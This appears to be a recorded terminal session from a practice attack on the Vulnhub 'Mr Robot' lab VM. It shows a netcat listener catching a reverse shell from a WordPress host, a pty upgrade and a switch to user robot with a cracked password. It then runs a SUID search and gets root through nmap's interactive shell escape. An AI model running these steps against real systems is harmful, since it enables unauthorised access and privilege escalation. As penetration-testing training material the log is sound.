@@ -1,0 +1,326 @@
+Script started on 2020-10-28 07:18:36-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ip addr
+1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host 
+       valid_lft forever preferred_lft forever
+2: [36meth0: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:5c:65:26[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m192.168.0.17[0m/24 brd [35m192.168.0.255 [0mscope global dynamic noprefixroute eth0
+       valid_lft 604045sec preferred_lft 604045sec
+    inet6 [34mfe80::a00:27ff:fe5c:6526[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# nc -vnlp 444[K3
+listening on [any] 443 ...
+connect to [192.168.0.17] from (UNKNOWN) [192.168.0.28] 36111
+bash: cannot set terminal process group (1509): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ 
+
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd 
+cd 
+daemon@linux:~$ ls
+ls
+add-shell
+addgroup
+adduser
+arp
+arpd
+chgpasswd
+chpasswd
+chroot
+cpgr
+cppw
+cron
+cytune
+delgroup
+deluser
+dpkg-preconfigure
+dpkg-reconfigure
+e2freefrag
+e4defrag
+fdformat
+filefrag
+groupadd
+groupdel
+groupmod
+grpck
+grpconv
+grpunconv
+grub
+grub-floppy
+grub-install
+grub-macbless
+grub-md5-crypt
+grub-mkconfig
+grub-mkdevicemap
+grub-probe
+grub-reboot
+grub-set-default
+grub-terminfo
+iconvconfig
+install-sgmlcatalog
+invoke-rc.d
+ip6tables-apply
+iptables-apply
+kernel-helper
+ldattach
+locale-gen
+logrotate
+mkinitramfs
+mklost+found
+newusers
+nfnl_osf
+nologin
+ntpdate
+ntpdate-debian
+pam-auth-update
+pam_getenv
+pam_timestamp_check
+pwck
+pwconv
+pwunconv
+readprofile
+remove-shell
+rmt
+rmt-tar
+rsyslogd
+rtcwake
+safe_finger
+service
+setvesablank
+sshd
+tarcat
+tcpd
+tcpdchk
+tcpdmatch
+try-from
+tunelp
+tzconfig
+ufw
+update-ca-certificates
+update-catalog
+update-grub
+update-initramfs
+update-locale
+update-mime
+update-passwd
+update-rc.d
+update-xmlcatalog
+useradd
+userdel
+usermod
+validlocale
+vcstime
+vigr
+vipw
+visudo
+vmtoolsd
+vmware-checkvm
+vmware-rpctool
+vmware-vmblock-fuse
+vsftpd
+zic
+daemon@linux:~$ 
+
+daemon@linux:~$ pyto  thon -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+$ 
+
+$ cd /home/robot
+cd /home/robot
+$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ sudo -l
+sudo -l
+[sudo] password for daemon: 
+
+Sorry, try again.
+[sudo] password for daemon: ^C
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# su robot
+su: user robot does not exist or the user entry does not contain all the required fields
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# passwd rovot[K[K[Kbot
+passwd: user 'robot' does not exist
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# passwd robot[Kpasswd robot[K
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# passwd robot[4Psu[C[C[C[C[C[Cnc -vnlp 443
+listening on [any] 443 ...
+connect to [192.168.0.17] from (UNKNOWN) [192.168.0.28] 36113
+bash: cannot set terminal process group (1509): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/
+cd /home/
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ 
+
+daemon@linux:/home/robot$ su robot
+su robot
+su: must be run from a terminal
+daemon@linux:/home/robot$ python -c 'import pty;pyt  t   pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ 
+
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ 
+
+robot@linux:~$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+robot@linux:~$ cat key	-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ 
+
+robot@linux:~$ find / per   -perm 4000 -f    -type f 2> /dev/null
+find / -perm 4000 -type f 2> /dev/null
+robot@linux:~$ 
+
+robot@linux:~$ ^[[A    finds  / -perm /4000 -type 7 f 2? > /dev/null
+find / -perm /4000 -type f 2> /dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+
+robot@linux:~$ find / -perm -4000 -type f 2> /dev/null
+find / -perm -4000 -type f 2> /dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+
+robot@linux:~$ nmap --interative
+nmap --interative
+nmap: unrecognized option '--interative'
+Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
+Some Common Scan Types ('*' options require root privileges)
+* -sS TCP SYN stealth port scan (default if privileged (root))
+  -sT TCP connect() port scan (default for unprivileged users)
+* -sU UDP port scan
+  -sP ping scan (Find any reachable machines)
+* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
+  -sV Version scan probes open ports determining service & app names/versions
+  -sR RPC scan (use with other scan types)
+Some Common Options (none are required, most can be combined):
+* -O Use TCP/IP fingerprinting to guess remote operating system
+  -p <range> ports to scan.  Example range: 1-1024,1080,6666,31337
+  -F Only scans ports listed in nmap-services
+  -v Verbose. Its use is recommended.  Use twice for greater effect.
+  -P0 Don't ping hosts (needed to scan www.microsoft.com and others)
+* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys
+  -6 scans via IPv6 rather than IPv4
+  -T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> General timing policy
+  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]
+  -oN/-oX/-oG <logfile> Output normal/XML/grepable scan logs to <logfile>
+  -iL <inputfile> Get targets from file; Use '-' for stdin
+* -S <your_IP>/-e <devicename> Specify source address or network interface
+  --interactive Go into interactive mode (then press h for help)
+Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'
+SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES 
+robot@linux:~$ nam  map in  --interative
+nmap --interative
+nmap: unrecognized option '--interative'
+Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
+Some Common Scan Types ('*' options require root privileges)
+* -sS TCP SYN stealth port scan (default if privileged (root))
+  -sT TCP connect() port scan (default for unprivileged users)
+* -sU UDP port scan
+  -sP ping scan (Find any reachable machines)
+* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
+  -sV Version scan probes open ports determining service & app names/versions
+  -sR RPC scan (use with other scan types)
+Some Common Options (none are required, most can be combined):
+* -O Use TCP/IP fingerprinting to guess remote operating system
+  -p <range> ports to scan.  Example range: 1-1024,1080,6666,31337
+  -F Only scans ports listed in nmap-services
+  -v Verbose. Its use is recommended.  Use twice for greater effect.
+  -P0 Don't ping hosts (needed to scan www.microsoft.com and others)
+* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys
+  -6 scans via IPv6 rather than IPv4
+  -T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> General timing policy
+  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]
+  -oN/-oX/-oG <logfile> Output normal/XML/grepable scan logs to <logfile>
+  -iL <inputfile> Get targets from file; Use '-' for stdin
+* -S <your_IP>/-e <devicename> Specify source address or network interface
+  --interactive Go into interactive mode (then press h for help)
+Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'
+SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES 
+robot@linux:~$ 
+
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !/sh    / !sh
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# whpami    oami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-off -3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# 
+
+# cat fits  s rstboot_done
+cat firstboot_done
+# 
+
+# ^C
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# ^C
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# 
+]0;root@kali: /home/kali/TryJao/OSCP-Vulnhub/mrrobot[1;31mroot@kali[00m:[1;34m/home/kali/TryJao/OSCP-Vulnhub/mrrobot[00m# exiut[K[Kt
+exit
+
+Script done on 2020-10-28 07:53:26-04:00 [COMMAND_EXIT_CODE="130"]
